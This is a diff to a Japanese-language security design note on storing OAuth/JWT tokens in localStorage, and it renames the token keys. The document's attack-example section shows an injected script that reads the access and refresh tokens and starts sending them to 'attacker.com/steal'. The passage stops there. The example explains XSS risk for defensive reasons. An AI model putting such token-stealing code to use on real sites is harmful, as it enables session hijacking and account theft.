@@ -19,8 +19,8 @@ OAuth 2.0 / JWT 認証では、2 種類のトークンを使用します。
 
 ```typescript
 // 現在の実装
-localStorage.setItem('nyx_cast_access_token', accessToken);
-localStorage.setItem('nyx_cast_refresh_token', refreshToken);
+localStorage.setItem('frontend_cast_access_token', accessToken);
+localStorage.setItem('frontend_cast_refresh_token', refreshToken);
 ```
 
 | メリット               | デメリット                      |
@@ -87,8 +87,8 @@ localStorage を使用している場合の攻撃例:
 
 ```javascript
 // 攻撃者が注入した悪意のあるスクリプト
-const accessToken = localStorage.getItem('nyx_cast_access_token');
-const refreshToken = localStorage.getItem('nyx_cast_refresh_token');
+const accessToken = localStorage.getItem('frontend_cast_access_token');
+const refreshToken = localStorage.getItem('frontend_cast_refresh_token');
 
 // 攻撃者のサーバーに送信
 fetch('https://attacker.com/steal', {
